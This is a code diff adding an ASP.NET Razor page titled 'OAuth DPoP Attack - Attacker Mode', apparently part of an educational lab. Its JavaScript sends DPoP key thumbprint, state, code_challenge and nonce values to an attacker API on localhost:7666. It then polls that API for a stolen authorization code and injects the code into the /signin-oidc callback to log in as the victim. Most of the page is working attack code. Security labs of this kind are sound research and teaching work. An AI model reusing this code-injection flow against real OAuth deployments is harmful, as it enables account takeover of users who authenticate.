@@ -1,0 +1,255 @@
+@{
+    ViewData["Title"] = "OAuth DPoP Attack - Attacker Mode";
+}
+
+<div class="container">
+    <h1 class="text-danger">⚠️ OAuth DPoP Attack - Attacker Mode</h1>
+
+    <div class="alert alert-warning">
+        <strong>Warning:</strong> This page demonstrates a security vulnerability for educational purposes only.
+    </div>
+
+    <div class="card mb-3">
+        <div class="card-body">
+            <h5 class="card-title">Attacker Controls</h5>
+            <div class="alert alert-info">
+                <strong>Attack Steps:</strong>
+                <ol>
+                    <li>Click "Initialize Attack"</li>
+                    <li>Click "Start OAuth Flow" - this will redirect you to the authorize endpoint</li>
+                    <li>Copy <code>dpop_jkt</code>, <code>state</code>, and <code>code_challenge</code> from the authorize URL</li>
+                    <li>Paste them below and submit (this sends them to the victim)</li>
+                    <li>Wait for victim to authenticate on /Home/Secure</li>
+                    <li>Click "Complete Login with Stolen Code" to inject the stolen code into your OAuth callback</li>
+                </ol>
+            </div>
+            <div id="controls">
+                <button class="btn btn-danger" onclick="initAttacker()">Initialize Attack</button>
+                <button class="btn btn-primary" onclick="startOAuthFlow()" disabled id="start-btn">Start OAuth Flow</button>
+                <button class="btn btn-secondary" onclick="checkStatus()">Check Status</button>
+            </div>
+            <div class="mt-3">
+                <strong>Session ID:</strong> <span id="session-id" class="text-monospace">Not initialized</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="card mb-3">
+        <div class="card-body">
+            <h5 class="card-title">Manual Parameter Entry</h5>
+            <p class="text-muted">After starting the OAuth flow, copy these parameters from the authorize URL:</p>
+            <div class="mb-3">
+                <label for="dpop-jkt-input" class="form-label"><strong>DPoP JKT:</strong></label>
+                <input type="text" class="form-control" id="dpop-jkt-input" placeholder="e.g., NzbLsXh8uDCcd-6MNwXF4W_7noWXFZAfHkxZsRGC9Xs">
+                <small class="form-text text-muted">Look for <code>dpop_jkt=...</code> in the browser address bar</small>
+            </div>
+            <div class="mb-3">
+                <label for="state-input" class="form-label"><strong>State:</strong></label>
+                <input type="text" class="form-control" id="state-input" placeholder="e.g., CfDJ8...">
+                <small class="form-text text-muted">Look for <code>state=...</code> in the same URL</small>
+            </div>
+            <div class="mb-3">
+                <label for="code-challenge-input" class="form-label"><strong>Code Challenge:</strong></label>
+                <input type="text" class="form-control" id="code-challenge-input" placeholder="e.g., abc123...">
+                <small class="form-text text-muted">Look for <code>code_challenge=...</code> in the same URL</small>
+            </div>
+            <div class="mb-3">
+                <label for="nonce-input" class="form-label"><strong>Nonce:</strong></label>
+                <input type="text" class="form-control" id="nonce-input" placeholder="e.g., 638...">
+                <small class="form-text text-muted">Look for <code>nonce=...</code> in the same URL</small>
+            </div>
+            <button class="btn btn-warning" onclick="submitDpopJkt()" disabled id="submit-jkt-btn">Submit Parameters</button>
+        </div>
+    </div>
+
+    <div class="card mb-3">
+        <div class="card-body">
+            <h5 class="card-title">Complete Attack</h5>
+            <p class="text-muted">After the victim authenticates and their code is stolen:</p>
+            <button class="btn btn-success" onclick="injectStolenCode()" disabled id="inject-btn">Complete Login with Stolen Code</button>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-body">
+            <h5 class="card-title">Status</h5>
+            <pre id="status" style="background: #f5f5f5; padding: 10px; border-radius: 4px; max-height: 300px; overflow-y: auto;">Ready. Click "Initialize Attack" to begin.</pre>
+        </div>
+    </div>
+</div>
+
+<script src="https://localhost:7666/attack.js"></script>
+<script>
+    let attackInstance = null;
+
+    function initAttacker() {
+        attackInstance = new OAuthAttack();
+        attackInstance.initAttacker();
+
+        document.getElementById('session-id').textContent = attackInstance.sessionId;
+        document.getElementById('start-btn').disabled = false;
+        document.getElementById('submit-jkt-btn').disabled = false;
+        document.getElementById('inject-btn').disabled = false;
+
+        updateStatus('Attacker mode initialized. Session ID: ' + attackInstance.sessionId);
+
+        // Start polling for stolen code
+        setInterval(checkStatus, 3000);
+    }
+
+    function startOAuthFlow() {
+        if (!attackInstance) {
+            alert('Please initialize attack first');
+            return;
+        }
+        
+        updateStatus('Starting OAuth flow... You will be redirected to the authorize endpoint. Copy the dpop_jkt, state, code_challenge, and nonce from the URL.');
+        
+        // Trigger the actual OAuth flow through the backend
+        // This will cause the backend to generate code_verifier and store it in session
+        window.location.href = '/Home/Secure';
+    }
+    
+    async function submitDpopJkt() {
+        if (!attackInstance) {
+            alert('Please initialize attack first');
+            return;
+        }
+
+        const dpopJkt = document.getElementById('dpop-jkt-input').value.trim();
+        const state = document.getElementById('state-input').value.trim();
+        const codeChallenge = document.getElementById('code-challenge-input').value.trim();
+        const nonce = document.getElementById('nonce-input').value.trim();
+        
+        if (!dpopJkt) {
+            alert('Please enter a DPoP JKT value');
+            return;
+        }
+
+        if (!state) {
+            alert('Please enter the state parameter value');
+            return;
+        }
+
+        if (!codeChallenge) {
+            alert('Please enter the code_challenge parameter value');
+            return;
+        }
+
+        if (!nonce) {
+            alert('Please enter the nonce parameter value');
+            return;
+        }
+
+        updateStatus(`Submitting parameters:\ndpop_jkt: ${dpopJkt}\nstate: ${state.substring(0, 20)}...\ncode_challenge: ${codeChallenge.substring(0, 20)}...\nnonce: ${nonce.substring(0, 20)}...`);
+
+        try {
+            const response = await fetch(`https://localhost:7666/api/attack/dpop`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: attackInstance.sessionId,
+                    dpopProof: dpopJkt,
+                    dpopHeader: dpopJkt,
+                    url: 'https://localhost:5001/connect/authorize',
+                    method: 'GET',
+                    nonce: nonce,
+                    codeChallenge: codeChallenge
+                })
+            });
+
+            if (response.ok) {
+                // Store the state and nonce in sessionStorage for later use
+                sessionStorage.setItem('attacker_state', state);
+                sessionStorage.setItem('attacker_nonce', nonce);
+                
+                updateStatus('✓ Successfully submitted all parameters!');
+                document.getElementById('dpop-jkt-input').style.borderColor = '#28a745';
+                document.getElementById('state-input').style.borderColor = '#28a745';
+                document.getElementById('code-challenge-input').style.borderColor = '#28a745';
+                document.getElementById('nonce-input').style.borderColor = '#28a745';
+            } else {
+                updateStatus('✗ Failed to submit parameters: ' + response.statusText);
+            }
+        } catch (error) {
+            console.error('Failed to submit parameters:', error);
+            updateStatus('✗ Error submitting parameters: ' + error.message);
+        }
+    }
+
+    async function injectStolenCode() {
+        if (!attackInstance) {
+            alert('Please initialize attack first');
+            return;
+        }
+
+        // Get the stored state
+        const storedState = sessionStorage.getItem('attacker_state');
+        
+        if (!storedState) {
+            alert('Please submit the parameters first!');
+            return;
+        }
+
+        updateStatus('Fetching stolen authorization code...');
+
+        try {
+            // Fetch the stolen code
+            const response = await fetch(`https://localhost:7666/api/attack/code/${attackInstance.sessionId}`);
+            
+            if (!response.ok) {
+                updateStatus('❌ No stolen code available yet. Status: ' + response.status);
+                alert('No stolen code available yet. Make sure the victim has authenticated on /Home/Secure.');
+                return;
+            }
+
+            const codeData = await response.json();
+            updateStatus(`✅ Got stolen code: ${codeData.code.substring(0, 20)}...\n\nRedirecting to OAuth callback with stolen code...`);
+            
+            // Redirect to the OAuth callback endpoint with the stolen code and attacker's state
+            // The backend will retrieve the code_verifier from the attacker's session and complete the exchange
+            const callbackUrl = `/signin-oidc?code=${encodeURIComponent(codeData.code)}&state=${encodeURIComponent(storedState)}`;
+            window.location.href = callbackUrl;
+            
+        } catch (error) {
+            updateStatus('❌ Error fetching code: ' + error.message);
+            console.error('Error:', error);
+        }
+    }
+
+    async function checkStatus() {
+        if (!attackInstance) return;
+
+        try {
+            const response = await fetch(`https://localhost:7666/api/attack/status/${attackInstance.sessionId}`);
+            const status = await response.json();
+
+            updateStatus(JSON.stringify(status, null, 2));
+
+            // Enable inject button if we have a code
+            if (status.hasAuthCode) {
+                document.getElementById('inject-btn').classList.remove('btn-success');
+                document.getElementById('inject-btn').classList.add('btn-warning');
+                document.getElementById('inject-btn').textContent = '⚡ Stolen Code Available - Click to Use!';
+            }
+        } catch (error) {
+            console.error('Failed to check status:', error);
+        }
+    }
+
+    function updateStatus(message) {
+        document.getElementById('status').textContent = message;
+    }
+
+    // Auto-initialize if coming from AttackerApi
+    window.addEventListener('DOMContentLoaded', () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('auto') === 'true' || document.referrer.includes('7666')) {
+            setTimeout(() => {
+                initAttacker();
+                updateStatus('Auto-initialized from AttackerApi. Click "Start OAuth Flow" to begin.');
+            }, 500);
+        }
+    });
+</script>
+
